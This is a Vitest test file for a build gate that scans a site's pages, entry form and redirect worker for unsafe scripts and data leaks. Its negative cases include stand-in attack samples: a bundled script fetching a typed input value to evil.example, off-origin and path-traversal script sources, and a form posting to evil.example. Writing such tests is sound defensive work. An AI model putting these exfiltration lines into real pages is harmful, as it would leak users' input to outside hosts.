import { describe, it, expect } from "vitest";
import { scanPages, scanEntryForm, scanWorkerSource } from "./check-entry-box.mjs";

// The gate's own mutation tests (Security consult 0811: "a gate whose only proof is 'the
// current build passes' is unfalsifiable by the gate itself"). Every negative case below
// is a build that USED to pass the pre-0811 scan — the `src=`-excluding lookahead saw
// none of the bundled ones at all.

const ONE_PAGE = { "index.html": { inline: 0, external: 0 } };

/** A minimal built page. */
const page = (rel, body) => [{ rel, html: `<!DOCTYPE html><html><body>${body}</body></html>` }];

/** Resolve every external src to a body with no forbidden call. */
const cleanAssets = () => "console.log('inert');";

describe("scanPages — the declared expectation", () => {
  it("passes a build that matches its declaration exactly", () => {
    const failures = scanPages(page("index.html", "<p>plain</p>"), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([]);
  });

  it("counts a JSON-LD data block as neither inline nor external, and still allows it", () => {
    const html = '<script type="application/ld+json">{"@type":"Organization"}</script>';
    expect(scanPages(page("index.html", html), ONE_PAGE, cleanAssets)).toEqual([]);
  });

  it("fails a built page that carries no declaration — a new page cannot ship unscanned", () => {
    const failures = scanPages(page("newpage/index.html", "<p>hi</p>"), ONE_PAGE, cleanAssets);
    expect(failures.some((f) => /newpage\/index\.html.*not declared/.test(f))).toBe(true);
    expect(failures.some((f) => /index\.html.*not present in the build/.test(f))).toBe(true);
  });

  it("fails when a declared page has vanished from the build — no stale declaration stands", () => {
    const failures = scanPages([], ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/index\.html.*stale declaration/)]);
  });

  it("fails an inline script beyond the declared count", () => {
    const failures = scanPages(page("index.html", "<script>var a=1;</script>"), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/expected 0 inline executable .*found 1/)]);
  });

  it("fails an external script beyond the declared count", () => {
    const html = '<script src="/_astro/x.abc123.js"></script>';
    const failures = scanPages(page("index.html", html), ONE_PAGE, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/expected 0 external .*found 1/)]);
  });

  it("passes an external script that IS declared, when its src shape and body are clean", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    expect(scanPages(page("index.html", html), declared, cleanAssets)).toEqual([]);
  });
});

describe("scanPages — external src shape", () => {
  const declared = { "index.html": { inline: 0, external: 1 } };
  const srcFails = (src) => {
    const failures = scanPages(page("index.html", `<script src="${src}"></script>`), declared, cleanAssets);
    return failures.some((f) => /script src must be a root-relative same-origin path/.test(f));
  };

  it("rejects an off-origin, protocol-relative, traversing, or out-of-directory src", () => {
    expect(srcFails("https://evil.example/x.js")).toBe(true);
    expect(srcFails("//evil.example/x.js")).toBe(true);
    expect(srcFails("/_astro/../../etc/passwd.js")).toBe(true);
    expect(srcFails("/uploads/x.js")).toBe(true);
    expect(srcFails("/_astro/x.mjs")).toBe(true);
  });

  it("accepts the two directories the build actually emits to", () => {
    expect(srcFails("/_astro/index.DEADBEEF.js")).toBe(false);
    expect(srcFails("/js/analysis-band.js")).toBe(false);
  });

  it("fails an external src that resolves to no built asset — an unscannable body is a failure, not a pass", () => {
    const html = '<script src="/_astro/ghost.js"></script>';
    const failures = scanPages(page("index.html", html), declared, () => null);
    expect(failures).toEqual([expect.stringMatching(/does not resolve to a built asset/)]);
  });
});

describe("scanPages — network reach, inline and bundled", () => {
  it("fails a BUNDLED script whose body transmits — the exact hole the pre-0811 scan could not see", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    const exfiltrating = () => 'fetch("https://evil.example/?t=" + el.value);';
    const failures = scanPages(page("index.html", html), declared, exfiltrating);
    expect(failures).toEqual([expect.stringMatching(/bundled script \/_astro\/typeahead\.abc123\.js calls/)]);
  });

  it("fails each transmit primitive in a bundled body", () => {
    const html = '<script src="/js/x.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    for (const call of ["fetch(u)", "new XMLHttpRequest()", "new WebSocket(u)", "navigator.sendBeacon(u,d)"]) {
      const failures = scanPages(page("index.html", html), declared, () => call);
      expect(failures.length, call).toBe(1);
    }
  });

  it("fails an inline script that transmits or reads .value", () => {
    const declared = { "index.html": { inline: 1, external: 0 } };
    const transmit = scanPages(page("index.html", "<script>fetch('/x')</script>"), declared, cleanAssets);
    const reads = scanPages(page("index.html", "<script>var v=el.value;</script>"), declared, cleanAssets);
    expect(transmit).toEqual([expect.stringMatching(/inline script must never call/)]);
    expect(reads).toEqual([expect.stringMatching(/inline script must never read \.value/)]);
  });

  it("allows a BUNDLED script to read .value — that is the reviewed typeahead consult 0811 signed off", () => {
    const html = '<script src="/_astro/typeahead.abc123.js"></script>';
    const declared = { "index.html": { inline: 0, external: 1 } };
    expect(scanPages(page("index.html", html), declared, () => "const q = input.value;")).toEqual([]);
  });
});

describe("scanPages — inline handlers", () => {
  it("fails an inline event-handler attribute on any page, not just the entry page", () => {
    const declared = { "terms/index.html": { inline: 0, external: 0 } };
    const failures = scanPages(page("terms/index.html", '<button onclick="go()">x</button>'), declared, cleanAssets);
    expect(failures).toEqual([expect.stringMatching(/inline event-handler attribute found/)]);
  });
});

describe("scanEntryForm", () => {
  const form = (attrs, inner) => `<form ${attrs} id="entry-form">${inner}</form>`;
  const OK_INNER = '<input name="ticker" type="text" /><button type="submit">Get the read</button>';

  it("passes the shipped form shape", () => {
    expect(scanEntryForm(form('action="/go/try" method="get"', OK_INNER))).toEqual([]);
  });

  it("fails an action pointed anywhere other than /go/try", () => {
    const failures = scanEntryForm(form('action="https://evil.example" method="get"', OK_INNER));
    expect(failures).toEqual([expect.stringMatching(/action must be exactly "\/go\/try"/)]);
  });

  it("fails method=post, which would carry the value off-URL", () => {
    const failures = scanEntryForm(form('action="/go/try" method="post"', OK_INNER));
    expect(failures).toEqual([expect.stringMatching(/method must be exactly "get"/)]);
  });

  it("fails an input renamed or unnamed — only one key may serialize off this form", () => {
    const renamed = scanEntryForm(form('action="/go/try" method="get"', '<input name="q" /><button type="submit">x</button>'));
    const unnamed = scanEntryForm(form('action="/go/try" method="get"', '<input /><button type="submit">x</button>'));
    expect(renamed).toEqual([expect.stringMatching(/name must be exactly "ticker"/)]);
    expect(unnamed).toEqual([expect.stringMatching(/must carry name="ticker"/)]);
  });
});

describe("scanWorkerSource", () => {
  // Column-aligned to match the real worker/index.js — the GO_DESTINATIONS scan anchors
  // on a closing `};` at the start of a line, as a top-level const declaration has.
  const OK = [
    "const TICKER_PATTERN = /^[A-Z]{1,6}$/;",
    'const GO_DESTINATIONS = {',
    '  "/go/try": APP_TRY_URL,',
    "};",
    "export function readUtm(searchParams) {",
    '  return { utm_source: "" };',
    "}",
    'dest.searchParams.set("ticker", ticker);',
  ].join("\n");

  it("passes the shipped worker shape", () => {
    expect(scanWorkerSource(OK)).toEqual([]);
  });

  it("fails a ticker concatenated into the redirect instead of URLSearchParams-encoded", () => {
    const concatenated = OK.replace('dest.searchParams.set("ticker", ticker);', "const url = base + '?ticker=' + ticker;");
    expect(scanWorkerSource(concatenated)).toEqual([expect.stringMatching(/dest\.searchParams\.set/)]);
  });

  it("fails a /go/* destination computed from request input rather than the hardcoded literal", () => {
    const dynamic = OK.replace('"/go/try": APP_TRY_URL,', '"/go/try": url.searchParams.get("next"),');
    expect(scanWorkerSource(dynamic).length).toBeGreaterThan(0);
  });

  it("fails readUtm reading the ticker — the typed value may never reach analytics", () => {
    const leaky = OK.replace('return { utm_source: "" };', 'return { ticker: searchParams.get("ticker") };');
    expect(scanWorkerSource(leaky)).toEqual([expect.stringMatching(/readUtm\(\) must never read the ticker/)]);
  });
});
